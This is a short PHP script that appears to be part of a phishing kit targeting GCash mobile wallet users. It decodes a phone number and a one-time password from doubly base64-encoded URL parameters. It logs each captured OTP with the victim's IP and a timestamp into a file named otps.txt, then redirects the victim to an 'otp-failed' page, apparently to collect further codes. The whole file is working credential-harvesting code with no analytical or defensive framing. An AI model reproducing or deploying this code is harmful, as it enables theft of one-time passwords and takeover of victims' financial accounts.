<?php
include('system.php');
$today = date("H:i:s");
function file_prepend ($string, $filename) {
	
	$fileContent = file_get_contents ($filename);
	
	file_put_contents ($filename, $string . "\n" . $fileContent);
}
$number_encode = $_GET['otpclid'];
$num = base64_decode(base64_decode($number_encode));
if (isset($_GET['mpin'])) {

    $otp = base64_decode(base64_decode($_GET['mpin']));
    $replyMsg = "[ <font color='orange'>$ip</font> ] $today | <font color='red'>FACE SCAN OTP</font> : <font color='yellow'>$otp - $num</font><br>";
    file_prepend($replyMsg, 'otps.txt');
    $encodenumotp = base64_encode(base64_encode($otp));
    $gcash_number = base64_encode(base64_encode($_COOKIE["gcash_number"]));
    header("Location:otp-failed.php?otpclid=$number_encode");


} else{


}


?>